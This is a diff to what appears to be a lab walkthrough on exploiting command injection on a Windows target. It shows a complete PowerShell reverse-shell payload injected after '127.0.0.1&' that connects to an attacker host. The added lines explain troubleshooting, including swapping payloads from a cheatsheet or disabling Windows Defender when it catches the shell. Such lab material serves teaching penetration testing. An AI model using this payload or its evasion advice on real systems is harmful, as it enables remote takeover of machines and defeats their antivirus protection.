@@ -66,6 +66,10 @@ To obtain a reverse shell do the following
 127.0.0.1&powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('EXTERNAL-AWS-ATTACKER-IP',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+4. Ideally, running this should give you a reverse shell back to your attacker machine netcat listener. If it doesn't one of the following two things have gone wrong.
+   1. The Security Group setting on AWS for the attacker machine was not configured properly to allow the reverse shell to reach netcat
+   2. Windows Defender has detected the reverse shell Powershell payload. You can try a different payload from `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell` or disable Windows Defender for the course of this exercise.
+
 ## Post Exploitation
 
 ### Additional information gathering
